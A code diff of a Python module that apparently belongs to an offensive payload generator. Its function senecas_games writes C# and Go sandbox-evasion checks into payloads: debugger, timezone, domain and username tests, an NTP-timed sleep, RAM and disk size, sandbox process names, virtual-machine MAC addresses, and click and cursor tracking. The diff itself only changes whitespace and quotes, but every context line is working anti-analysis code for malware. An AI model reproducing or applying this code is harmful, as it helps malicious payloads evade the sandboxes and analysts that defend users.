@@ -1,6 +1,6 @@
-'''
+"""
 This file contains the payload sandbox checks for each respective language
-'''
+"""
 
 from datetime import date
 from datetime import timedelta
@@ -694,14 +694,14 @@ def senecas_games(evasion_payload):
 
             # Add a tab for this check
             num_tabs_required += 1
-        
+
         if evasion_payload.required_options["TIMEZONE"][0].lower() != 'x':
 
             check_code += '\t' * num_tabs_required + 'if (TimeZone.CurrentTimeZone.StandardName != "Coordinated Universal Time") {\n'
 
             # Add a tab for this check
             num_tabs_required += 1
-        
+
         if evasion_payload.required_options["DEBUGGER"][0].lower() != 'x':
 
             check_code += '\t' * num_tabs_required + 'if (!System.Diagnostics.Debugger.IsAttached) {\n'
@@ -715,7 +715,7 @@ def senecas_games(evasion_payload):
         if evasion_payload.required_options["DOMAIN"][0].lower() != "x":
 
             check_code += '\t' * num_tabs_required + 'if (string.Equals("' + evasion_payload.required_options["DOMAIN"][0] + '", System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName, StringComparison.CurrentCultureIgnoreCase)) {\n'
-            
+
             # Add a tab for this check
             num_tabs_required += 1
 
@@ -732,13 +732,13 @@ def senecas_games(evasion_payload):
             rand_char_name = evasion_helpers.randomString()
             check_code += '\t' * num_tabs_required + 'string {} = System.Security.Principal.WindowsIdentity.GetCurrent().Name;\n'.format(rand_user_name)
             check_code += '\t' * num_tabs_required + "string[] {} = {}.Split('\\\\');\n".format(rand_char_name, rand_user_name)
-            check_code += '\t' * num_tabs_required + 'if ({}[1].Contains("{}")) {{\n\n'.format(rand_char_name, evasion_payload.required_options["USERNAME"][0])            
+            check_code += '\t' * num_tabs_required + 'if ({}[1].Contains("{}")) {{\n\n'.format(rand_char_name, evasion_payload.required_options["USERNAME"][0])
 
             # Add a tab for this check
             num_tabs_required += 1
 
         if evasion_payload.required_options["SLEEP"][0].lower() != "x":
-            
+
             check_code += '\t' * num_tabs_required + 'var NTPTransmit = new byte[48];NTPTransmit[0] = 0x1B; var secondTransmit = new byte[48]; secondTransmit[0] = 0x1B;  var skip = false;\n'
             check_code += '\t' * num_tabs_required + 'var addr = Dns.GetHostEntry("us.pool.ntp.org").AddressList;var sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);\n'
             check_code += '\t' * num_tabs_required + 'try { sock.Connect(new IPEndPoint(addr[0], 123)); sock.ReceiveTimeout = 6000; sock.Send(NTPTransmit); sock.Receive(NTPTransmit); sock.Close(); } catch { skip = true; }\n'
@@ -795,18 +795,18 @@ def senecas_games(evasion_payload):
             check_code += 'binary.Write(newsock, binary.BigEndian, second_transmit);binary.Read(newsock, binary.BigEndian, second_transmit)\n'
             check_code += 'if int(time.Date(1900, 1, 1, 0, 0, 0, 0, time.UTC).Add(time.Duration(((second_transmit.ReceiveTime >> 32)*1000000000))).Sub(val).Seconds()) >= ' + evasion_payload.required_options["SLEEP"][0] + ' {'
             num_tabs_required += 1
-        
+
         if evasion_payload.required_options["UTCCHECK"][0].lower() != "false":
-            
+
             tzone_abbrev = evasion_helpers.randomString()
             tzone_offset = evasion_helpers.randomString()
-            
+
             check_code += '_, ' + tzone_offset + ' := time.Now().Zone()\n'
             check_code += 'if ' + tzone_offset + ' != 0 {\n'
             num_tabs_required += 1
-        
+
         if evasion_payload.required_options["USERPROMPT"][0].lower() != "false":
-            
+
             title_box = evasion_helpers.randomString()
             message_box = evasion_helpers.randomString()
             user32_dll = evasion_helpers.randomString()
@@ -822,9 +822,9 @@ def senecas_games(evasion_payload):
             check_code += '0)\n'
             check_code += 'if true {\n'
             num_tabs_required += 1
-        
+
         if evasion_payload.required_options["RAMCHECK"][0].lower() != 'false':
-            
+
             memstatusx = evasion_helpers.randomString()
             kernel32_dll = evasion_helpers.randomString()
             globalmem_status = evasion_helpers.randomString()
@@ -848,9 +848,9 @@ def senecas_games(evasion_payload):
             check_code += globalmem_status + '.Call(uintptr(unsafe.Pointer(&' + mem_info + ')))\n'
             check_code += 'if (' + mem_info + '.ullTotalPhys/1073741824 >= 3) {\n'
             num_tabs_required += 1
-        
+
         if evasion_payload.required_options["PROCCHECK"][0].lower() != 'false':
-            
+
             kernel32 = evasion_helpers.randomString()
             createtoolhelp = evasion_helpers.randomString()
             proc32first = evasion_helpers.randomString()
@@ -907,9 +907,9 @@ def senecas_games(evasion_payload):
             check_code += '}\n'
             check_code += 'if len(' + ev_of_sandbox + ') == 0 {\n'
             num_tabs_required += 1
-        
+
         if evasion_payload.required_options["MINPROCS"][0].lower() != 'x':
-            
+
             kernel32 = evasion_helpers.randomString()
             createtoolhelp = evasion_helpers.randomString()
             proc32first = evasion_helpers.randomString()
@@ -964,9 +964,9 @@ def senecas_games(evasion_payload):
             check_code += '}\n'
             check_code += 'if (' + count_running_procs + ' >= ' + min_processes + ') {\n'
             num_tabs_required += 1
-        
+
         if evasion_payload.required_options["BADMACS"][0].lower() != 'false':
-            
+
             evd_sandbox = evasion_helpers.randomString()
             bad_addrs = evasion_helpers.randomString()
             nics = evasion_helpers.randomString()
@@ -985,9 +985,9 @@ def senecas_games(evasion_payload):
             check_code += '}\n'
             check_code += 'if len(' + evd_sandbox + ') == 0 {\n'
             num_tabs_required += 1
-        
+
         if evasion_payload.required_options["CLICKTRACK"][0].lower() != 'x':
-            
+
             usr32 = evasion_helpers.randomString()
             getkey_state = evasion_helpers.randomString()
             counter = evasion_helpers.randomString()
@@ -1011,9 +1011,9 @@ def senecas_games(evasion_payload):
             check_code += '}\n'
             check_code += 'if true {\n'
             num_tabs_required += 1
-        
+
         if evasion_payload.required_options["CURSORCHECK"][0].lower() != 'false':
-            
+
             usr32 = evasion_helpers.randomString()
             cursor_position = evasion_helpers.randomString()
             point_struct = evasion_helpers.randomString()
@@ -1034,7 +1034,7 @@ def senecas_games(evasion_payload):
             check_code += cursor_position + '.Call(uintptr(unsafe.Pointer(&' + point_var2 + ')))\n'
             check_code += 'if ' + point_var1 + '.x - ' + point_var2 + '.x == 0 && ' + point_var1 + '.y - ' + point_var2 + '.y == 0 {\n'
             num_tabs_required += 1
-        
+
         if evasion_payload.required_options["DISKSIZE"][0].lower() != 'x':
 
             min_disk_size = evasion_helpers.randomString()
